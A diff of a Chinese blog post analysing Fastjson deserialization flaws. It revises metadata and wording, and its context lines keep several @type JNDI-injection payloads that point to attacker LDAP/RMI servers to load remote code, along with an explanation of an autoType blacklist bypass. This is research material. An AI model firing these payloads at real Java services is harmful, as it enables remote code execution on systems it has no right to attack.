@@ -77,10 +77,9 @@
 <meta property="og:image" content="https://hai0unu11.github.io/images/image-20260415112446758.png">
 <meta property="og:image" content="https://hai0unu11.github.io/images/image-20260415112757095.png">
 <meta property="article:published_time" content="2026-08-13T03:27:53.000Z">
-<meta property="article:modified_time" content="2026-08-13T09:39:00.694Z">
+<meta property="article:modified_time" content="2026-08-17T02:50:43.205Z">
 <meta property="article:author" content="Hai0u">
-<meta property="article:tag" content="Java">
-<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="Fastjson">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://hai0unu11.github.io/images/image-20260407111640438.png">
 
@@ -198,7 +197,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -257,9 +256,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2026-08-13 11:27:53 / 修改时间：17:39:00" itemprop="dateCreated datePublished" datetime="2026-08-13T11:27:53+08:00">2026-08-13</time>
+      <time title="创建时间：2026-08-13 11:27:53" itemprop="dateCreated datePublished" datetime="2026-08-13T11:27:53+08:00">2026-08-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-08-17 10:50:43" itemprop="dateModified" datetime="2026-08-17T10:50:43+08:00">2026-08-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -267,7 +272,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/code-audit/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+          <a href="/categories/security-research/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
         </span>
     </span>
 
@@ -284,7 +289,7 @@
 <p>提供两个主要接口来分别实现序列化和反序列化操作。</p>
 <p><code>JSON.toJSONString</code> 将 Java 对象转换为 json 对象，序列化的过程。</p>
 <p><code>JSON.parseObject/JSON.parse</code> 将 json 对象重新变回 Java 对象；反序列化的过程</p>
-<p>fastjson 在反序列化的时候会去找我们在 <code>@type</code> 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。这三种方法中存在危险操就是攻击者传入要进行反序列化的类中的构造函数、<code>getter</code>方法、<code>setter</code>方法中要存在漏洞才能触发</p>
+<p>Fastjson 在处理 <code>@type</code> 时会尝试解析指定类型，并依据反序列化规则实例化对象、访问属性或调用部分 setter&#x2F;getter。并非所有方法都会被自动调用；只有当可控类型的构造函数、getter、setter 或其他反序列化回调中存在危险操作时，才可能形成可利用链。</p>
 <p><strong>Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：</strong></p>
 <p><strong>满足条件的setter：</strong></p>
 <ul>
@@ -382,7 +387,7 @@
 <p>开始调试，到com.alibaba.fastjson.parser.ParserConfig#checkAutoType的(this.autoTypeSupport || expectClass !&#x3D; null)。</p>
 <p><img src="/images/image-20260413172922474.png" alt="image-20260413172922474"></p>
 <p>跟进，它会判断我们 @type 类是否为黑名单那里面的类。这里会循环很久，可以直接跳出来，继续往下走。</p>
-<p>走到loadClass()，它隶属的类是 TypeUTtils</p>
+<p>执行到 <code>loadClass()</code>，该方法位于 <code>TypeUtils</code> 类中。</p>
 <p>有一步语句非常非常关键。如果我们这个类的起始是 L，结尾是 ;，就把这两个家伙给干掉，变成空白，所以这里返回过来的就是 com.sun.rowset.JdbcRowSetImpl 了，然后就绕过了</p>
 <p><img src="/images/image-20260413173103066.png" alt="image-20260413173103066"></p>
 <p><img src="/images/image-20260413173144615.png" alt="image-20260413173144615"></p>
@@ -493,15 +498,15 @@
 <p>1.2.47版本：</p>
 <p><img src="/images/image-20260414163219968.png" alt="image-20260414163219968"></p>
 <p>因此，即使未开启AutoTypeSupport，但com.sun.rowset.JdbcRowSetImpl类并未缓存到Map中，就不能和前面一样调用TypeUtils.getClassFromMapping()来加载了，只能进入后面的代码逻辑进行黑白名单校验被过滤掉：</p>
-<h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson &lt;&#x3D; 1.2.61 漏洞分析"></a>Fastjson &lt;&#x3D; 1.2.61 漏洞分析</h2><p><strong>Fastjson1.2.5 &lt;&#x3D; 1.2.59</strong></p>
+<h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson &lt;&#x3D; 1.2.61 漏洞分析"></a>Fastjson &lt;&#x3D; 1.2.61 漏洞分析</h2><p><strong>Fastjson 1.2.59 及以下相关利用场景</strong></p>
 <p><strong>需要开启AutoType</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>Fastjson1.2.5 &lt;&#x3D; 1.2.60</strong></p>
+<p><strong>Fastjson 1.2.60 及以下相关利用场景</strong></p>
 <p><strong>需要开启AutoType：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&quot;xaDataSourceName&quot;:&quot;rmi://10.10.20.166:1099/ExportObject&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://10.10.20.166:1389/ExportObject&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>Fastjson1.2.5 &lt;&#x3D; 1.2.61</strong></p>
+<p><strong>Fastjson 1.2.61 及以下相关利用场景</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploi</span><br></pre></td></tr></table></figure>
 
 <h2 id="1-2-62-漏洞利用"><a href="#1-2-62-漏洞利用" class="headerlink" title="1.2.62 漏洞利用"></a>1.2.62 漏洞利用</h2><ul>
@@ -752,7 +757,6 @@
 <p>com.caucho.config.types.ResourceRef类PoC：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-
     </div>
 
     
@@ -761,8 +765,7 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Java/" rel="tag"># Java</a>
-              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/Fastjson/" rel="tag"># Fastjson</a>
           </div>
 
         
